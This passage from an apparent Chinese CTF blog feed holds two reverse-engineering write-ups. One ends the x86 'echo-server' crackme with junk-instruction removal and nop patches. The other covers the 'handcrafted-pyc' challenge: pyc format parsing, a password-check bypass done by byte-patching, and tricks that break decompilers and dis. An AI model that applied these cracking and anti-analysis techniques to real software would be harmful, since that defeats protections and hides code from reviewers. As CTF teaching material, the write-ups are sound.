      mov     dword ptr [esp], offset a02x ; &quot;%02X&quot;.text:080487A0                 call    _printf.text:080487A5                 add     [ebp+var_C], 1.text:080487A9.text:080487A9 loc_80487A9:                            ; CODE XREF: sub_804875D+27↑j.text:080487A9                 mov     eax, [ebp+var_C].text:080487AC                 cmp     eax, [ebp+arg_4].text:080487AF                 jb      short loc_8048786.text:080487B1.text:080487B1 loc_80487B1:                            ; CODE XREF: sub_804875D+1E↑j.text:080487B1                 mov     dword ptr [esp], 0Ah ; c.text:080487B8                 call    _putchar.text:080487BD                 jz      short near ptr loc_80487C1+1.text:080487BF                 jnz     short near ptr loc_80487C1+1.text:080487C1.text:080487C1 loc_80487C1:                            ; CODE XREF: sub_804875D+60↑j.text:080487C1                                         ; sub_804875D+62↑j ....text:080487C1                 call    near ptr 915A4B8Fh.text:080487C1 sub_804875D     endp ; sp-analysis failed.text:080487C1.text:080487C6.text:080487C6 loc_80487C6:                            ; DMA page register 74LS612:.text:080487C6                 in      eax, 81h        ; Channel 2 (diskette DMA)  (address bits 16-23).text:080487C8                 in      al, dx.text:080487C9                 mov     [eax], al.text:080487C9 ; ---------------------------------------------------------------------------</code></pre><p>这个函数显然是不对的，堆栈本身并没有平衡，<code>main</code>函数里跳到的地方是<code>0x080487C4</code>已经被其它指令占了，这里去花一下，多余的指令码干脆用<code>nop</code>patch掉</p><pre><code class="asm">sub_804875D     proc near.text:0804875D.text:0804875D var_10          = dword ptr -10h.text:0804875D var_C           = dword ptr -0Ch.text:0804875D arg_0           = dword ptr  8.text:0804875D arg_4           = dword ptr  0Ch.text:0804875D.text:0804875D ; __unwind {.text:0804875D                 push    ebp.text:0804875E                 mov     ebp, esp.text:08048760                 sub     esp, 28h.text:08048763                 mov     eax, [ebp+arg_0].text:08048766                 mov     [ebp+var_10], eax.text:08048769                 cmp     [ebp+arg_0], 0.text:0804876D                 jnz     short loc_804877D.text:0804876F                 mov     dword ptr [esp], offset format ; &quot;NULL&quot;.text:08048776                 call    _printf.text:0804877B                 jmp     short loc_80487B1.text:0804877D ; ---------------------------------------------------------------------------.text:0804877D.text:0804877D loc_804877D:                            ; CODE XREF: sub_804875D+10↑j.text:0804877D                 mov     [ebp+var_C], 0.text:08048784                 jmp     short loc_80487A9.text:08048786 ; ---------------------------------------------------------------------------.text:08048786.text:08048786 loc_8048786:                            ; CODE XREF: sub_804875D+52↓j.text:08048786                 mov     eax, [ebp+var_10].text:08048789                 lea     edx, [eax+1].text:0804878C                 mov     [ebp+var_10], edx.text:0804878F                 movzx   eax, byte ptr [eax].text:08048792                 movzx   eax, al.text:08048795                 mov     [esp+4], eax.text:08048799                 mov     dword ptr [esp], offset a02x ; &quot;%02X&quot;.text:080487A0                 call    _printf.text:080487A5                 add     [ebp+var_C], 1.text:080487A9.text:080487A9 loc_80487A9:                            ; CODE XREF: sub_804875D+27↑j.text:080487A9                 mov     eax, [ebp+var_C].text:080487AC                 cmp     eax, [ebp+arg_4].text:080487AF                 jb      short loc_8048786.text:080487B1.text:080487B1 loc_80487B1:                            ; CODE XREF: sub_804875D+1E↑j.text:080487B1                 mov     dword ptr [esp], 0Ah ; c.text:080487B8                 call    _putchar.text:080487BD                 jz      short locret_80487C2.text:080487BF                 jnz     short locret_80487C2.text:080487C1                 nop                     ; Keypatch modified this from:.text:080487C1                                         ;   db 0E8h.text:080487C2.text:080487C2 locret_80487C2:                         ; CODE XREF: sub_804875D+60↑j.text:080487C2                                         ; sub_804875D+62↑j.text:080487C2                 leave.text:080487C3                 retn.text:080487C3 ; } // starts at 804875D.text:080487C3 sub_804875D     endp</code></pre><p>这是这个函数本来的样子，而<code>main</code>函数里面调用的根本就不是这个函数，而是下面</p><pre><code class="asm">.text:080487C4 ; ---------------------------------------------------------------------------.text:080487C4 ; __unwind {.text:080487C4                 push    ebp             ; CODE XREF: main+49↓p.text:080487C5                 mov     ebp, esp.text:080487C7                 sub     esp, 88h.text:080487CD                 mov     eax, large gs:14h.text:080487D3                 mov     [ebp-0Ch], eax.text:080487D6                 xor     eax, eax.text:080487D8                 mov     dword ptr [esp+8], 14h.text:080487E0                 mov     dword ptr [esp+4], 0.text:080487E8                 lea     eax, [ebp-70h].text:080487EB                 mov     [esp], eax.text:080487EE                 call    _memset.text:080487F3.text:080487F3 loc_80487F3:                            ; CODE XREF: .text:loc_80487F3↑j.text:080487F3                 jmp     short near ptr loc_80487F3+1.text:080487F3 ; ---------------------------------------------------------------------------.text:080487F5                 db 0C0h.text:080487F6                 db  48h ; H.text:080487F7                 db 0C7h</code></pre><p>下面并没有分析，因为又遇到了一个花指令</p><pre><code class="asm">.text:080487F3                 jmp     short near ptr loc_80487F3+1</code></pre><p>代码重叠，分析一下本来的指令是什么</p><pre><code class="asm">text:080487F4 ; ---------------------------------------------------------------------------.text:080487F4                 inc     eax.text:080487F6                 dec     eax.text:080487F7                 mov     dword ptr [esp+8], 14h.text:080487FF                 lea     eax, [ebp-70h].text:08048802                 mov     [esp+4], eax.text:08048806                 mov     dword ptr [esp], 0.text:0804880D                 call    _read.text:08048812                 xor     eax, eax.text:08048814                 jz      short loc_804881D.text:08048816                 jmp     near ptr 6F44B961h</code></pre><p>又来</p><pre><code class="asm">.text:08048812                 xor     eax, eax.text:08048814                 jz      short loc_804881D</code></pre><p>自己和自己异或肯定是0，这个跳转是一定会实现的，后面的语句并没有什么用但是IDA还是进行了分析然后出错，patch掉继续看</p><pre><code class="asm">.text:08048816                 nop                     ; Keypatch modified this from:.text:08048816                                         ;   db 0E9h.text:08048816 ; ---------------------------------------------------------------------------.text:08048817 aF1Ga           db &#39;F1@gA&#39;,0.text:0804881D ; ---------------------------------------------------------------------------.text:0804881D.text:0804881D loc_804881D:                            ; CODE XREF: .text:08048814↑j.text:0804881D                 mov     dword ptr [esp+8], 5.text:08048825                 mov     dword ptr [esp+4], 8048817h.text:0804882D                 lea     eax, [ebp-70h].text:08048830                 mov     [esp], eax.text:08048833                 call    _strncmp.text:08048838                 test    eax, eax.text:0804883A                 jnz     short loc_80488A3.text:0804883C                 mov     dword ptr [esp], offset aYouAreVeryClos ; &quot;You are very close! Now patch me~&quot;.text:08048843                 call    _puts.text:08048848                 mov     eax, ds:dword_804A088.text:0804884D                 test    eax, eax.text:0804884F                 jz      short loc_8048866</code></pre><p>去花之后变成了一个字符串，后面还有一个比较操作，如果输入这个字符串，就会输出<code>You are very close! Now patch me~</code></p><p>后面肯定还有操作，往后面看</p><pre><code class="asm">.text:08048848                 mov     eax, ds:dword_804A088.text:0804884D                 test    eax, eax.text:0804884F                 jz      short loc_8048866</code></pre><p>这三句很关键，如果<code>eax</code>是0，就会进行后面的跳转，所以查找一下<code>ds:dword_804A088</code>交叉引用，在<code>main</code>里面发现</p><pre><code class="asm">.text:08048913                 mov     ds:dword_804A088, 1</code></pre><p>所以这个跳转是永远不会实现的，先看看不跳转后面会执行什么</p><pre><code class="asm">.text:08048851 loc_8048851:                            ; CODE XREF: .text:08048857↓j.text:08048851                 mov     ax, 5EBh.text:08048855                 xor     eax, eax.text:08048857                 jz      short near ptr loc_8048851+1</code></pre><p>又是一个花指令，重新分析这几句</p><pre><code class="asm">.text:08048852 loc_8048852:                            ; CODE XREF: .text:08048857↓j.text:08048852                 mov     eax, 0C03105EBh.text:08048857                 jz      short loc_8048852</code></pre><p>发现进入了一个死循环，所以题目让我们patch的意思是不走这个循环，也就是真正应该执行的是前面没走的那个分支</p><pre><code class="asm">loc_8048866:                            ; CODE XREF: .text:0804884F↑j.text:08048866                 lea     eax, [ebp-70h].text:08048869                 mov     [esp], eax.text:0804886C                 call    _strlen.text:08048871                 mov     dword ptr [esp+8], 0.text:08048879                 mov     [esp+4], eax.text:0804887D                 lea     eax, [ebp-70h].text:08048880                 add     eax, 1.text:08048883                 mov     [esp], eax.text:08048886                 call    _MD5.text:0804888B                 mov     [ebp-74h], eax.text:0804888E                 mov     dword ptr [esp+4], 10h.text:08048896                 mov     eax, [ebp-74h].text:08048899                 mov     [esp], eax.text:0804889C                 call    sub_804875D.text:080488A1                 jmp     short loc_80488C0.text:080488A3 ; ---------------------------------------------------------------------------.text:080488A3.text:080488A3 loc_80488A3:                            ; CODE XREF: .text:0804883A↑j.text:080488A3                 lea     eax, [ebp-70h].text:080488A6                 mov     [esp], eax.text:080488A9                 call    _strlen.text:080488AE                 sub     eax, 1.text:080488B1                 mov     [esp+4], eax.text:080488B5                 lea     eax, [ebp-70h].text:080488B8                 mov     [esp], eax.text:080488BB                 call    sub_804875D.text:080488C0.text:080488C0 loc_80488C0:                            ; CODE XREF: .text:080488A1↑j.text:080488C0                 mov     eax, ds:stdout.text:080488C5                 mov     [esp], eax.text:080488C8                 call    _fflush.text:080488CD                 mov     eax, [ebp-0Ch].text:080488D0                 xor     eax, large gs:14h.text:080488D7                 jz      short locret_80488DE.text:080488D9                 call    ___stack_chk_fail.text:080488DE ; ---------------------------------------------------------------------------.text:080488DE.text:080488DE locret_80488DE:                         ; CODE XREF: .text:080488D7↑j.text:080488DE                 leave.text:080488DF                 retn.text:080488DF ; } // starts at 80487C4</code></pre><p>执行到结束，计算了一个<code>md5</code>然后调用最开始分析的<code>sub_804875D</code>函数以16进制的形式输出，所以这里有两个选择，有linux环境可以直接patch跳转语句然后执行得到flag</p><pre><code class="bash">-&gt;./echo-server                **************               Echo Server 0.3 ALPHA               **************F1@gAYou are very close! Now patch me~F8C60EB40BF66919A77C4BD88D45DEF4</code></pre><p>当然也可以自己算<code>md5</code>，看看关键函数</p><pre><code class="asm">.text:08048866                 lea     eax, [ebp-70h].text:08048869                 mov     [esp], eax.text:0804886C                 call    _strlen.text:08048871                 mov     dword ptr [esp+8], 0.text:08048879                 mov     [esp+4], eax.text:0804887D                 lea     eax, [ebp-70h].text:08048880                 add     eax, 1.text:08048883                 mov     [esp], eax.text:08048886                 call    _MD5</code></pre><p>首先是把我们输入的字符串的地址拷贝到<code>eax</code>中，把该地址写到栈顶，调用<code>_strlen</code>，求的就是我们输入的字符串的长度，我们输入的是<code>&#39;F1@gA\n&#39;</code>，返回的值是<code>0x06</code>，储存在eax中，写到了栈顶的第二个位置（第三个位置的0并不知道什么意思，或许是第三个参数，没查到函数原型，暂时先不管了），但是栈顶元素并不是我们输入的字符串，而是首地址加1的位置，长度还是6，所以要用<code>md5</code>加密的字符串应该是<code>&#39;1@gA\x0a\x00&#39;</code>，<code>python</code>调用<code>hashlib</code>算一下</p><pre><code class="python">import hashlibm=hashlib.md5()m.update(b&#39;1@gA\x0a\x00&#39;)m.hexdigest().upper()#&#39;F8C60EB40BF66919A77C4BD88D45DEF4&#39;</code></pre><p>两种方法都可以得到flag</p><pre><code>F8C60EB40BF66919A77C4BD88D45DEF4</code></pre><p>其实这题并没有什么难度，为什么写这么长呢？</p><p><del>(实在不想写数据结构作业)</del></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>花指令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>handcrafted-pyc-攻防世界</title>
    <link href="/2020/03/16/handcrafted-pyc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    <url>/2020/03/16/handcrafted-pyc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<p>很早以前就想写一篇关于python的字节码的文章，但是一直没什么时间，借着刚好做到这一题，写一写我对相关内容的理解。</p><a id="more"></a><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>拿到的题目并不是一个pyc格式的文件</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-import marshal, zlib, base64exec(marshal.loads(zlib.decompress(base64.b64decode(&#39;eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ==&#39;))))</code></pre><p>通过解码之后运行，提示输入密码，将其转为pyc格式的文件</p><pre><code class="python">import marshal, zlib, base64import impb64d = base64.b64decode(&#39;eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ==&#39;)zd = zlib.decompress(b64d)ml = marshal.loads(zd)with open(&#39;crackme.pyc&#39;,&#39;wb&#39;) as f:    f.write(imp.get_magic() + b&#39;\0&#39; * 4 + zd)</code></pre><p>具体写入的内容是什么在后面介绍。</p><h4 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h4><p><em>PyCodeObject</em>定义如下</p><pre><code class="c++">typedef struct {    PyObject_HEAD    int co_argcount;        /* #arguments, except *args */    int co_nlocals;     /* #local variables */    int co_stacksize;       /* #entries needed for evaluation stack */    int co_flags;       /* CO_..., see below */    PyObject *co_code;      /* instruction opcodes */    PyObject *co_consts;    /* list (constants used) */    PyObject *co_names;     /* list of strings (names used) */    PyObject *co_varnames;  /* tuple of strings (local variable names) */    PyObject *co_freevars;  /* tuple of strings (free variable names) */    PyObject *co_cellvars;      /* tuple of strings (cell variable names) */    /* The rest doesn&#39;t count for hash/cmp */    PyObject *co_filename;  /* string (where it was loaded from) */    PyObject *co_name;      /* string (name, for reference) */    int co_firstlineno;     /* first source line number */    PyObject *co_lnotab;    /* string (encoding addr&lt;-&gt;lineno mapping) */} PyCodeObject;</code></pre><p>以本题为例</p><pre><code>-&gt; hexdump -C crackme.pyc 00000000  03 f3 0d 0a 00 00 00 00  63 00 00 00 00 00 00 00  |........c.......|00000010  00 02 00 00 00 40 00 00  00 73 23 00 00 00 64 01  |.....@...s#...d.|00000020  00 84 00 00 5a 00 00 65  01 00 64 02 00 6b 02 00  |....Z..e..d..k..|00000030  72 1f 00 65 00 00 83 00  00 01 6e 00 00 64 00 00  |r..e......n..d..|00000040  53</code></pre><p>首先几个字节是文件头，首先的四个字节是 <code>MagicNumber</code> ， 接下来的四个字节是 <code>时间戳</code> ，采用<code>小端序</code>，不过写入的都是0，也无所谓，和<code>PE</code>文件格式里的时间一样，这一项实际上并没有什么用，这里对应的是之前写入的<code>imp.get_magic() + b&#39;\0&#39; * 4</code>，只有包含这样的文件头才是一个合法的<code>pyc</code>文件。</p><p>后面是 <code>PyCodeObject</code> 。首先会有一个 <code>TYPE_CODE</code> ， 这里是字符 ， 所以是 <code>C</code> ， 即<code>0x63</code> 。后面是参数个数 <code>co_argcount</code> ， 局部变量个数 <code>co_nlocals</code> ， 栈空间 <code>co_stacksize</code> ， 和 <code>co_flags</code> ，每项均占用4个字节。</p><p>我们可以解析出来这样的一个结构（需要注意是小端序）</p><pre><code>magic 03f30d0amoddate 00000000 (Thu Jan  1 08:00:00 1970)code   argcount 0   nlocals 0   stacksize 2   flags 0040   code      6401008400005a00006501006402006b0200721f00650000830000016e00      0064000053</code></pre><p><code>co_flags</code>后面是<code>co_code</code>，把它单独拿出来，因为它也有一些自己的结构</p><h5 id="co-code"><a href="#co-code" class="headerlink" title="co_code"></a>co_code</h5><p>同样先是 <code>TYPE_CODE</code> , 类型标识 ， 这里是 <code>s</code> ， 即 <code>0x73</code> 。后面的四个字节用来标识指令的 <code>长度</code> ， 这里是 <code>0x23</code> 。紧跟在后面的是具体的字节码，包含<code>指令</code>和<code>操作数</code>，有些指令是没有操作数的，指令占用一个字节，操作数占用两个字节，字节码和指令的对应关系和指令的作用可以查阅<a href="https://rycbar.xyz/2020/03/13/python-opcode/" target="_blank" rel="noopener">这篇文章</a>或者直接去查阅<code>dis</code>的手册。</p><blockquote><p>给出链接</p><p><a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="noopener">https://docs.python.org/2/library/dis.html</a></p><p><a href="https://github.com/python/cpython/blob/master/Include/opcode.h" target="_blank" rel="noopener">https://github.com/python/cpython/blob/master/Include/opcode.h</a></p></blockquote><p>用<code>dis</code>模块来解析一下这段字节码</p><pre><code>  1           0 LOAD_CONST               1 (&lt;code object main at 0000000003656E30, file &quot;&lt;string&gt;&quot;, line 1&gt;)              3 MAKE_FUNCTION            0              6 STORE_NAME               0 (main)  4           9 LOAD_NAME                1 (__name__)             12 LOAD_CONST               2 (&#39;__main__&#39;)             15 COMPARE_OP               2 (==)             18 POP_JUMP_IF_FALSE       31  5          21 LOAD_NAME                0 (main)             24 CALL_FUNCTION            0             27 POP_TOP             28 JUMP_FORWARD             0 (to 31)        &gt;&gt;   31 LOAD_CONST               0 (None)             34 RETURN_VALUE</code></pre><p>第一列数字是这个代码块在源码中的行数 ， 第二列数字表示该指令在 <code>co_code</code> 中的偏移 ， 第三列表示具体操作 ， 第四列是操作数。 </p><p>这道题目可以看出来又调用了一个<em>PyCodeObject</em>，这个在后面在分析，先关注一个问题，这个</p><p><em>PyCodeObject</em>是通过<code>LOAD_CONST</code>指令调用的，是储存在co_const中的常量</p><h5 id="co-const"><a href="#co-const" class="headerlink" title="co_const"></a>co_const</h5><p>既然单拉出来就说明它也有自己的结构</p><p>每一项都是以<code>0x28</code> 开头，为 <code>TYPE_TUPLE</code>， 即 <code>&#39;(&#39;</code> 。接下来的四个字节为元素个数，这里是<code>0x03</code>。</p><pre><code>&gt;&gt;&gt; code.co_consts(None, &lt;code object main at 0x7fa4909ea530, file &quot;&lt;string&gt;&quot;, line 1&gt;, &#39;__main__&#39;)</code></pre><h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><p>后面为<code>co_names</code>，标识<code>0x28</code>，接着四个字节为元素个数 ， 然后字符类型 ， 字符内容。</p><p><code>co_varnames</code> , <code>co_freevars</code> , <code>co_cellvars</code> 结构与上面相同。</p><p>然后是<code>co_filename</code>，标识类型，路径长度 ，路径 。</p><p>然后是<code>co_name</code>，同样是标识类型，长度，内容。</p><p><code>co_firstlineno</code>，这里为<code>0x01</code> 。</p><p>字节码指令与源文件行号对应关系储存在<code>co_lnotab</code>，同样是标识类型，四字节长度，内容。</p><p>这是文件对应的信息（<code>const</code>去掉了<code>None</code>）</p><pre><code class="names">   names (&#39;main&#39;, &#39;__name__&#39;)   varnames ()   freevars ()   cellvars ()   filename &#39;&lt;string&gt;&#39;   name &#39;&lt;module&gt;&#39;   firstlineno 1   lnotab 000009030c01</code></pre><p><code>pyc</code>文件格式的粗略解析就差不多了，可以看出来比<code>ELF</code>，<code>PE</code>都要简单得多。</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>前面看到，本题还有一个<em>PyCodeObject</em> <em>main</em>是主要操作，所以用上面的方法再来解析一下<code>main</code>函数（太长了，就不全放出来了）</p><p>主要关注输入操作</p><pre><code>            737 LOAD_CONST               0 (None)            740 NOP                             741 JUMP_ABSOLUTE          759        &gt;&gt;  744 LOAD_GLOBAL              1 (raw_input)            747 JUMP_ABSOLUTE         1480        &gt;&gt;  750 LOAD_FAST                0 (password)            753 COMPARE_OP               2 (==)            756 JUMP_ABSOLUTE          767        &gt;&gt;  759 ROT_TWO                         760 STORE_FAST               0 (password)            763 POP_TOP                         764 JUMP_ABSOLUTE          744        &gt;&gt;  767 POP_JUMP_IF_FALSE     1591            770 LOAD_GLOBAL              0 (chr)            773 LOAD_CONST              17 (99)</code></pre><p>发现这里只是经过一个简单的比较，完全可以<code>bypass</code>，以16进制打开，修改<code>POP_JUMP_IF_FALSE     1591</code>成<code>nop</code>就可以了</p><p>所以开始查表<code>POP_JUMP_IF_FALSE</code>对应的值为<code>114</code>（0x72），<code>1591</code>（0x637）is <code>\x37\x06</code> （小端序）</p><p>所以要查找<code>72 37 06</code> ，<code>nop</code>对应的值为<code>09</code>，所以需要改成<code>09 09 09</code></p><p>然后直接运行，输入任何值都可以输出flag</p><pre><code class="bash">-&gt; ./crackme.pyc password: 0hitcon{Now you can compile and run Python bytecode in your brain!}</code></pre><p>当然也可以逐步分析</p><pre><code>        &gt;&gt;  767 POP_JUMP_IF_FALSE     1591            770 LOAD_GLOBAL              0 (chr)            773 LOAD_CONST              17 (99)            776 CALL_FUNCTION            1            779 LOAD_GLOBAL              0 (chr)            782 LOAD_CONST              10 (116)            785 CALL_FUNCTION            1            788 LOAD_GLOBAL              0 (chr)            791 LOAD_CONST              14 (105)            794 CALL_FUNCTION            1            797 LOAD_GLOBAL              0 (chr)            800 LOAD_CONST               9 (104)            803 CALL_FUNCTION            1            806 ROT_TWO            807 BINARY_ADD            808 ROT_TWO            809 BINARY_ADD            810 ROT_TWO            811 BINARY_ADD</code></pre><p>这是后面的一部分操作，分析一下，调用<code>chr()</code>函数，把存储的几个数字转成字符，此时的栈</p><pre><code>|--------high--------||--------&#39;c&#39;---------||--------&#39;t&#39;---------||--------&#39;i&#39;---------||--------&#39;h&#39;---------||--------...---------|</code></pre><p>执行一次<code>ROT_TWO</code>，栈顶两个元素换位，然后<code>BINARY_ADD</code>，经过几次，然后进行下一组</p><pre><code>|--------high--------|            |--------high--------|            |--------high--------||--------&#39;c&#39;---------|            |--------&#39;c&#39;---------|            |--------&#39;hitc&#39;------||--------&#39;t&#39;---------|            |--------&#39;t&#39;---------|            |--------...---------||--------&#39;i&#39;---------|            |--------&#39;hi&#39;--------||--------&#39;h&#39;---------|            |--------...---------||--------...---------|</code></pre><p>大概的变化过程就是这样，仔细分析，每四个字符一组，每组做一个倒序处理</p><p>然后跳转到最后</p><pre><code>        &gt;&gt; 2212 PRINT_ITEM           2213 PRINT_NEWLINE           2214 LOAD_CONST               0 (None)           2217 RETURN_VALUE</code></pre><p>直接输出，这样就得到需要的flag</p><h4 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h4><p>从上面也可以看出来，一个不经过处理的pyc文件是没有任何安全性可言的，甚至可以被一些工具如uncompyle6或者<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">在线工具</a>直接反编译成python代码，并且从代码风格来看准确率还是很高的，这时候就需要掌握一些简单的混淆/反混淆的技巧</p><h5 id="uncompyle6"><a href="#uncompyle6" class="headerlink" title="uncompyle6"></a>uncompyle6</h5><p>这个工具还是很好用的，但是一旦报错就停止对文件的分析，而且想让uncompyle6等工具报错也很简单，只需要在开头添加一个绝对跳转就可以了，<code>JUMP_ABSOLUTE 3</code>对应的字节码为 <code>71 03 00</code>，同时修改<code>co_code</code>的长度，这个时候使用一些工具就会报错</p><pre><code class="bash">&lt;&lt;&lt; Error: Decompiling stopped due to &lt;class &#39;uncompyle6.semantics.pysource.ParserError&#39;&gt;</code></pre><p>但是<code>dis</code>还是可以正常工作的，程序也是可以正常执行的，因为我们自己加入了3个字节，然后跳转到第四个字节（编号为3）的位置，只是多了一个执行周期，对程序的执行流程没有任何影响。</p><h5 id="dis"><a href="#dis" class="headerlink" title="dis"></a>dis</h5><p>对于一些新手来说，没法使用工具就基本上束手无策了，但是对于熟练掌握汇编语言的人来说，读懂<code>dis</code>解析出来的代码太容易了，就像刚刚我们就很容易的读懂了这道题目的执行逻辑<del>（虽然很简单）</del></p><p>所以还需要一定的方法阻止破解者使用<code>dis</code>进行分析</p><p>这会需要多一些处理</p><p>给代码段头部添加 <code>0x71 0x00 0x06 0x64 0xff 0xff</code> 。 同样需要修改 co_code 的长度。</p><p>这段指令的意义很简单</p><pre><code>  0 JUMP_ABSOLUTE            6  3 LOAD_CONST              65535   6 ...</code></pre><p>直接跳到了编号为6的位置，中间一句是不执行的，但是<code>dis</code>解析的时候会判断这句报错，因为不存在第65535项常量，这是条非法指令。但由于第一条绝对跳转的存在，第二条指令永远都不会被执行。通常的反汇编器如dis并不能理解实际执行的控制流，当反汇编器尝试反汇编第二条指令时，会去读取<code>co_const</code>的第65535项并且抛出一个异常。然后<code>dis</code>就会相应报错：</p><pre><code class="python">IndexError: tuple index out of range</code></pre><p>这比骗过IDA要容易得多</p><h5 id="虚假分支"><a href="#虚假分支" class="headerlink" title="虚假分支"></a>虚假分支</h5><p>合理设置条件，创造出很多程序不可能执行的分支，但是逆向者需要认真鉴别每一条分支是否被执行。</p><p>这不会使逆向者反汇编失败，但是会对分析造成极大的困难，就像是可恨的<a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="noopener">控制流平坦化</a>，属实劝退。</p><p><del>而且也没什么好办法，只能慢慢分析</del></p><h5 id="重叠指令"><a href="#重叠指令" class="headerlink" title="重叠指令"></a>重叠指令</h5><p>重叠指令在有变长指令的机器（如X86)上有广泛应用。直接在网上找了一些x86重叠指令：</p><pre><code class="asm">;单重叠00: EB 01           jmp  302: 68 c3 90 90 90  push 0x909090c3;实际执行00: EB 01           jmp  303: C3              retn</code></pre><pre><code class="asm">;多重叠指令00: EB02                    jmp  402: 69846A40682C104000EB02  imul eax, [edx + ebp*2 + 0102C6840], 0x002EB0040;实际执行00: EB02       jmp  404: 6A40       push 04006: 682C104000 push 0x40102C0B: EB02       jmp  0xF</code></pre><pre><code class="asm">;跳转至自身00: EBFF    jmp 102: C0C300  rol bl, 0;实际执行00: EBFF    jmp 101: FFC0    inc eax03: C3      retn</code></pre><p>在python上也同样适用</p><pre><code>0 JUMP_ABSOLUTE        [71 05 00]     5 3 NOP                   [09 -- --]4 LOAD_CONST           [64 64 00]     647 STOP_CODE            [00 -- --]</code></pre><p>一个简单的例子，进行了跳转之后，该位置是64，是有效指令所以读取了两个字节的操作数，实际上这段只执行了一句有效指令<code>LOAD_CONST 0</code></p><h5 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h5><p>现有的指令集是有定义的，但是如果有人修改了原有的定义，按照新的方式去赋值，就完全无法解析，遇见的不多，这样的情况似乎就只能通过函数的逻辑去猜测指令的意义</p><p><del>万恶的VM，万恶的出题人</del></p><h5 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h5><p>程序在循行开始的时候按照自己设定的加解密方式对真正的代码进行加密，然后再执行真正的代码部分，这样的方式利用python也可以实现</p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>本来是由一个题发散出来，结果写了很多，都只是一些个人的理解，整理整理才觉得还有很多需要学的东西。</p><p>解析的时候借用了一个国外大佬写的<code>dis</code>的代码，输出的层次很清晰，非常适合学习，<a href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html" target="_blank" rel="noopener">原文</a>写的也很不错。</p><pre><code class="python">import dis, marshal, struct, sys, time, typesdef show_file(fname):    f = open(fname, &quot;rb&quot;)    magic = f.read(4)    moddate = f.read(4)    modtime = time.asctime(time.localtime(struct.unpack(&#39;I&#39;, moddate)[0]))    print 